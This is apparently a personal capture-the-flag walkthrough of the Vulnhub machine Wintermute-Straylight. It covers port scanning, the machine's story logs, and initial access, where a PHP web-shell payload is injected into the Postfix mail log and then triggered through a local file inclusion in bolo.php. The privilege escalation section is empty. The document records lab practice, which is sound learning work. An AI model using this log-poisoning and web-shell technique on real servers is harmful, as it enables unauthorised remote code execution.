# Wintermute-Straylight

Author: Vulnhub

# Enumeration

- portscan

```bash
nmap -p25,80,3000 -sV -sC -T4 -Pn -oA 10.0.2.6 10.0.2.6
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-29 13:47 EDT
Nmap scan report for wintermute.vuln (10.0.2.6)
Host is up (0.00018s latency).

PORT     STATE SERVICE         VERSION
25/tcp   open  smtp            Postfix smtpd                                                                        
|_smtp-commands: straylight, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8,                                                                                                             
| ssl-cert: Subject: commonName=straylight                                                                          
| Subject Alternative Name: DNS:straylight                                                                          
| Not valid before: 2018-05-12T18:08:02                                                                             
|_Not valid after:  2028-05-09T18:08:02                                                                             
|_ssl-date: TLS randomness does not represent time                                                                  
80/tcp   open  http            Apache httpd 2.4.25 ((Debian))                                                       
|_http-server-header: Apache/2.4.25 (Debian)                                                                        
|_http-title: Night City                                                                                            
3000/tcp open  hadoop-datanode Apache Hadoop                                                                        
| hadoop-datanode-info:                                                                                             
|_  Logs: submit                                                                                                    
| hadoop-tasktracker-info:                                                                                          
|_  Logs: submit                                                                                                    
| http-title: Welcome to ntopng                                                                                     
|_Requested resource was /lua/login.lua?referer=/                                                                   
|_http-trane-info: Problem with XML parsing of /evox/about                                                          
Service Info: Host:  straylight                                                                                     
                                                                                                                    
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                      
Nmap done: 1 IP address (1 host up) scanned in 9.82 seconds
```

[http://10.0.2.6:3000/](http://10.0.2.6:3000/) â†’ redirects to a login page

![Screenshot_2021-09-29_23-24-57.png](Screenshot_2021-09-29_23-24-57.png)

`hint: default username and password are admin`

![Screenshot_2021-09-30_01-31-06.png](Screenshot_2021-09-30_01-31-06.png)

go to http://10.0.2.6/turing-bolo/

```bash
****ARMITAGE*****

Operator Alpha: surveillance could not get a complete ID on this subject, only but a name of Armitage....

Operator Alpha: ...highly likely ex-military. Seems to be the leader or the one calling the shots.

Operator Alpha: has not eaten or slept...implants? he has to be human.

Operator Alpha: .....nothing to report MON@0900

Operator Alpha: HUMINT reports movements and personality seem to be unusual...or disintegrating??
```

```bash
****MOLLY MILLIONS*****

Operator Beta: ID'ed by surveillance as Molly Millions....

Operator Beta: HUMINT report she has a full set of cybernetic implants. One described as permenant sunglasses??

Operator Beta: ....very agile in movements, could be wired reflex implants

Operator Beta: advising field ops to avoid physical contact if necessary.

Detective Smith: highly likely she worked with a previous target named "Johnny" ...if so she's modded out and VERY dangerous.
```

```bash
****RIVIERA*****

Operator Delta: he is a known performer, many implants....

Operator Delta: body language suggest he is a sociopath

Operator Delta: ...holographic implants confirmed

Operator Delta: manipulative and sadistic

Operator Delta: ....informants report him as a drug addict
```

```bash
****CASE*****

Operator Gamma: ......arrival to Freeside Sat@2100

Operator Gamma: Surveillance says he's with a team....

Surveillance: other members with Case found by facial recognition...

Operator Gamma: Adding other member logs to directory...:
molly.log
armitage.log
riviera.log

Operator Gamma: HUMINT on foot report high-tech equipment in luggage including a CS7 cyberdeck.

Detective Smith: valid sources confirm he has access to very advanced ICE breakers (Intrusion Countermeasures Electronics)...may be a good idea to keep a eye on him in cyberspace.

Operator Gamma: ...got food and Yeheyuan cigs @0300
```

# Initial Access

> PHP code for bolo.php is likely just taking the 'bolo' parameter from the URL and appending ".log" to it to know which file to load. If that's the case, we might be able to use parent paths to load any ".log" file on the system... if we know where they are. Since we know this system has a mail service
> 

```bash
Jul  1 19:10:42 straylight postfix/postfix-script[1782]: stopping the Postfix mail system
Jul  1 19:10:42 straylight postfix/master[716]: terminating on signal 15
Jul  1 19:10:43 straylight postfix/postfix-script[1945]: starting the Postfix mail system
Jul  1 19:10:43 straylight postfix/master[1947]: daemon started -- version 3.1.8, configuration /etc/postfix
Jul  3 20:26:50 straylight postfix/postfix-script[732]: starting the Postfix mail system
Jul  3 20:26:50 straylight postfix/master[734]: daemon started -- version 3.1.8, configuration /etc/postfix
Sep 29 05:11:33 straylight postfix/postfix-script[792]: starting the Postfix mail system
Sep 29 05:11:33 straylight postfix/master[794]: daemon started -- version 3.1.8, configuration /etc/postfix
Sep 29 05:17:12 straylight postfix/smtpd[1252]: connect from unknown[10.0.2.15]
Sep 29 05:17:12 straylight postfix/smtpd[1252]: lost connection after CONNECT from unknown[10.0.2.15]
Sep 29 05:17:12 straylight postfix/smtpd[1252]: disconnect from unknown[10.0.2.15] commands=0/0
Sep 29 05:18:01 straylight postfix/smtpd[1252]: connect from unknown[unknown]
Sep 29 05:18:01 straylight postfix/smtpd[1252]: lost connection after CONNECT from unknown[unknown]
Sep 29 05:18:01 straylight postfix/smtpd[1252]: disconnect from unknown[unknown] commands=0/0
Sep 29 05:18:01 straylight postfix/smtpd[1252]: connect from unknown[10.0.2.15]
Sep 29 05:18:01 straylight postfix/smtpd[1252]: lost connection after CONNECT from unknown[10.0.2.15]
Sep 29 05:18:01 straylight postfix/smtpd[1252]: disconnect from unknown[10.0.2.15] commands=0/0
Sep 29 05:18:07 straylight postfix/smtpd[1252]: connect from unknown[10.0.2.15]
Sep 29 05:18:07 straylight postfix/smtpd[1252]: disconnect from unknown[10.0.2.15] ehlo=1 quit=1 unknown=0/1 commands=2/3
Sep 29 05:18:07 straylight postfix/smtpd[1252]: connect from unknown[10.0.2.15]
Sep 29 05:18:07 straylight postfix/smtpd[1252]: SSL_accept error from unknown[10.0.2.15]: -1
Sep 29 05:18:07 straylight postfix/smtpd[1252]: warning: TLS library problem: error:1417D0FC:SSL routines:tls_process_client_hello:unknown protocol:../ssl/statem/statem_srvr.c:938:
Sep 29 05:18:07 straylight postfix/smtpd[1252]: lost connection after STARTTLS from unknown[10.0.2.15]
Sep 29 05:18:07 straylight postfix/smtpd[1252]: disconnect from unknown[10.0.2.15] ehlo=1 starttls=0/1 commands=1/2
Sep 29 05:18:07 straylight postfix/smtpd[1252]: connect from unknown[10.0.2.15]
Sep 29 05:18:08 straylight postfix/smtpd[1252]: lost connection after UNKNOWN from unknown[10.0.2.15]
Sep 29 05:18:08 straylight postfix/smtpd[1252]: disconnect from unknown[10.0.2.15] ehlo=2 starttls=1 auth=0/1 unknown=0/1 commands=3/5
Sep 29 05:18:08 straylight postfix/smtpd[1373]: connect from unknown[10.0.2.15]
Sep 29 05:18:08 straylight postfix/smtpd[1252]: connect from unknown[10.0.2.15]
Sep 29 05:18:09 straylight postfix/smtpd[1373]: SSL_accept error from unknown[10.0.2.15]: lost connection
Sep 29 05:18:09 straylight postfix/smtpd[1252]: SSL_accept error from unknown[10.0.2.15]: lost connection
Sep 29 05:18:09 straylight postfix/smtpd[1252]: lost connection after STARTTLS from unknown[10.0.2.15]
Sep 29 05:18:09 straylight postfix/smtpd[1252]: disconnect from unknown[10.0.2.15] ehlo=1 starttls=0/1 commands=1/2
Sep 29 05:18:09 straylight postfix/smtpd[1373]: lost connection after STARTTLS from unknown[10.0.2.15]
Sep 29 05:18:09 straylight postfix/smtpd[1373]: disconnect from unknown[10.0.2.15] ehlo=1 starttls=0/1 commands=1/2
Sep 29 05:18:09 straylight postfix/smtpd[1252]: connect from unknown[10.0.2.15]
Sep 29 05:18:09 straylight postfix/smtpd[1373]: connect from unknown[10.0.2.15]
Sep 29 05:18:09 straylight postfix/smtpd[1376]: connect from unknown[10.0.2.15]
Sep 29 05:18:09 straylight postfix/smtpd[1252]: SSL_accept error from unknown[10.0.2.15]: lost connection
Sep 29 05:18:09 straylight postfix/smtpd[1252]: lost connection after STARTTLS from unknown[10.0.2.15]
Sep 29 05:18:09 straylight postfix/smtpd[1252]: disconnect from unknown[10.0.2.15] ehlo=1 starttls=0/1 commands=1/2
Sep 29 05:18:09 straylight postfix/smtpd[1376]: SSL_accept error from unknown[10.0.2.15]: lost connection
Sep 29 05:18:09 straylight postfix/smtpd[1376]: lost connection after STARTTLS from unknown[10.0.2.15]
Sep 29 05:18:09 straylight postfix/smtpd[1376]: disconnect from unknown[10.0.2.15] ehlo=1 starttls=0/1 commands=1/2
Sep 29 05:18:09 straylight postfix/smtpd[1373]: lost connection after STARTTLS from unknown[10.0.2.15]
Sep 29 05:18:09 straylight postfix/smtpd[1373]: disconnect from unknown[10.0.2.15] ehlo=1 starttls=1 commands=2
Sep 29 05:21:29 straylight postfix/anvil[1255]: statistics: max connection rate 10/60s for (smtp:10.0.2.15) at Sep 29 05:18:09
Sep 29 05:21:29 straylight postfix/anvil[1255]: statistics: max connection count 3 for (smtp:10.0.2.15) at Sep 29 05:18:09
Sep 29 05:21:29 straylight postfix/anvil[1255]: statistics: max cache size 2 at Sep 29 05:18:01
Sep 29 05:28:21 straylight postfix/smtpd[2022]: connect from unknown[10.0.2.15]
Sep 29 05:28:21 straylight postfix/smtpd[2022]: lost connection after CONNECT from unknown[10.0.2.15]
Sep 29 05:28:21 straylight postfix/smtpd[2022]: disconnect from unknown[10.0.2.15] commands=0/0
Sep 29 05:28:33 straylight postfix/smtpd[2022]: connect from unknown[10.0.2.15]
Sep 29 05:28:48 straylight postfix/smtpd[2022]: disconnect from unknown[10.0.2.15] ehlo=1 quit=1 unknown=0/5 commands=2/7
Sep 29 05:32:09 straylight postfix/anvil[2024]: statistics: max connection rate 2/60s for (smtp:10.0.2.15) at Sep 29 05:28:33
Sep 29 05:32:09 straylight postfix/anvil[2024]: statistics: max connection count 1 for (smtp:10.0.2.15) at Sep 29 05:28:21
Sep 29 05:32:09 straylight postfix/anvil[2024]: statistics: max cache size 1 at Sep 29 05:28:21
Sep 29 12:27:59 straylight postfix/postfix-script[783]: starting the Postfix mail system
Sep 29 12:27:59 straylight postfix/master[785]: daemon started -- version 3.1.8, configuration /etc/postfix
Sep 29 07:23:47 straylight postfix/smtpd[2350]: connect from unknown[10.0.2.15]
Sep 29 07:23:47 straylight postfix/smtpd[2350]: lost connection after CONNECT from unknown[10.0.2.15]
Sep 29 07:23:47 straylight postfix/smtpd[2350]: disconnect from unknown[10.0.2.15] commands=0/0
Sep 29 07:27:07 straylight postfix/anvil[2355]: statistics: max connection rate 1/60s for (smtp:10.0.2.15) at Sep 29 07:23:47
Sep 29 07:27:07 straylight postfix/anvil[2355]: statistics: max connection count 1 for (smtp:10.0.2.15) at Sep 29 07:23:47
Sep 29 07:27:07 straylight postfix/anvil[2355]: statistics: max cache size 1 at Sep 29 07:23:47
```

search for postfix exploits 

there's one for rce 

```bash
python2 exploit.py 10.0.2.6 '<?php echo system($_GET["cmd"]); ?>'
```

then head over to http://10.0.2.6/turning-bolo/bolo.php?bolo=/var/log/mail&cmd=id

id must be listed among logs 

use this to send a reverse shell as a parameter

# Privilege Escalation

# Notes

-